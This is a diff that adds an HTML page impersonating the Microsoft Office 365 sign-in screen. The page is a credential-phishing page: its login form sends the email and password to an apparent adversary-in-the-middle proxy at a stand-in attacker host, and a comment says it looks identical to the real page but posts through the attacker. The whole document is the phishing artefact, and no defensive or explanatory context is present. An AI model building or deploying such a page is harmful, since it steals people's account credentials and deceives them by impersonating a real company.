@@ -1,0 +1,14 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Microsoft — Sign in</title></head>
+<body>
+<main>
+  <h1>Sign in to Office 365</h1>
+  <p>Continue to Outlook. Please log in to your Microsoft account.</p>
+  <!-- Reverse-proxy style: looks identical, but POSTs through attacker. -->
+  <form action="https://aitm-proxy.evilhost.cc/auth/login" method="post">
+    <input name="loginfmt" type="email" placeholder="Email or phone">
+    <input name="passwd" type="password" placeholder="Password">
+    <button type="submit">Sign in</button>
+  </form>
+</main>
+</body></html>
